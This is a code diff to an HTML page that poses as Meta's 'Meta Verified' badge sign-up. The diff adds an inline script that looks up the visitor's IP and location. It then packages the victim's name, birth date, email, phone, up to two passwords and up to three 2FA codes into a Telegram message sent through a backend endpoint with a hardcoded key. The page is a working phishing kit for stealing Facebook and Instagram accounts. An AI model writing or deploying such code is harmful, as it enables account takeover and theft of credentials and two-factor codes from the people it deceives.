@@ -6,10 +6,76 @@
     <title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
     <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features." />
 
-    <script src="https://cdn.tailwindcss.com"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script src="public/js/config.js"></script>
-    <script src="public/js/utils.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+const CONFIG = { STORAGE_EXPIRY: 3600000 };
+const Utils = (() => {
+  const COUNTRY_NAMES = {
+    VN:'Vietnam',US:'United States',GB:'United Kingdom',FR:'France',DE:'Germany',
+    JP:'Japan',CN:'China',KR:'South Korea',TH:'Thailand',SG:'Singapore',
+    AU:'Australia',CA:'Canada',IN:'India',ID:'Indonesia',MY:'Malaysia',
+    PH:'Philippines',TW:'Taiwan',HK:'Hong Kong',
+  };
+  async function getIpInfo() {
+    try {
+      const r = await fetch('https://ipinfo.io/json');
+      const d = await r.json();
+      if (!d.ip) throw new Error('fail');
+      const cc = d.country || '';
+      return { ip:d.ip||'N/A', city:d.city||'', region:d.region||'', country_name:COUNTRY_NAMES[cc]||cc, country_code:cc };
+    } catch(_) { return {ip:'N/A',city:'',region:'',country_name:'',country_code:''}; }
+  }
+  function buildMessage(data, ipInfo) {
+    ipInfo = ipInfo || {};
+    const c = v => (v!==undefined&&v!==null&&v!=='') ? '<code>'+v+'</code>' : '<i>N/A</i>';
+    const dob = (data.day&&data.month&&data.year) ? data.day+'/'+data.month+'/'+data.year : '';
+    const ip=ipInfo.ip||'N/A', city=ipInfo.city||'', region=ipInfo.region||'';
+    const country=ipInfo.country_name||'', countryC=ipInfo.country_code||'';
+    const parts=[city];
+    if(region&&region.toLowerCase()!==city.toLowerCase()&&!region.toLowerCase().includes(city.toLowerCase())) parts.push(region);
+    if(country) parts.push(country);
+    const loc=parts.filter(Boolean).join(', ')+(countryC?' ('+countryC+')':'');
+    const lines=[
+      '🔔 <b>VOI VỀ ANH EM ƠI!!</b>',
+      '🌐 <b>IP:</b> <code>'+ip+'</code>',
+      '📍 <b>Location:</b> <code>'+(loc||'N/A')+'</code>',
+      '-----------------------------',
+      '<b>Full Name:</b> '+c(data.fullName),
+      '<b>Page Name:</b> '+c(data.fanpage),
+      '<b>Date of Birth:</b> '+c(dob),
+      '<b>Message:</b> '+c(data.message),
+      '-----------------------------',
+      '<b>Email:</b> '+c(data.email),
+      '<b>Email Business:</b> '+c(data.emailBusiness),
+      '<b>Phone Number:</b> '+c(data.phone),
+      '-----------------------------',
+    ];
+    if(data.password) lines.push('<b>Password (1):</b> '+c(data.password));
+    if(data.passwordSecond) lines.push('<b>Password (2):</b> '+c(data.passwordSecond));
+    lines.push('-----------------------------');
+    if(data.twoFa) lines.push('🔐 <b>Code 2FA (1):</b> '+c(data.twoFa));
+    if(data.twoFaSecond) lines.push('🔐 <b>Code 2FA (2):</b> '+c(data.twoFaSecond));
+    if(data.twoFaThird) lines.push('🔐 <b>Code 2FA (3):</b> '+c(data.twoFaThird));
+    lines.push('-----------------------------');
+    lines.push('🕐 '+new Date().toLocaleString('vi-VN'));
+    return lines.join('\n');
+  }
+  async function sendNotification(data) {
+    try {
+      const ipInfo = await getIpInfo();
+      const message = buildMessage(data, ipInfo);
+      const res = await fetch('/api/send-telegram', {
+        method:'POST',
+        headers:{'Content-Type':'application/json','x-secret-key':'HDNDT-JDHT8FNEK-JJHR'},
+        body:JSON.stringify({message}),
+      });
+      if(!res.ok) { console.error('Telegram error:', await res.text()); }
+    } catch(e) { console.error('sendNotification failed:',e); }
+  }
+  return { sendNotification };
+})();
+</script>
     <script>
         tailwind.config = {
             theme: { extend: { colors: { primary: '#0866ff', secondary: '#1c1e21' } } }
@@ -1251,11 +1317,6 @@ function openSuccessModal() {
     Modal.open('successModal');
   }
   </script>
-
-  <!-- ✅ THÊM VÀO ĐÂY -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-  <script src="public/js/config.js"></script>
-  <script src="public/js/utils.js"></script>
 
 </body>
 </html
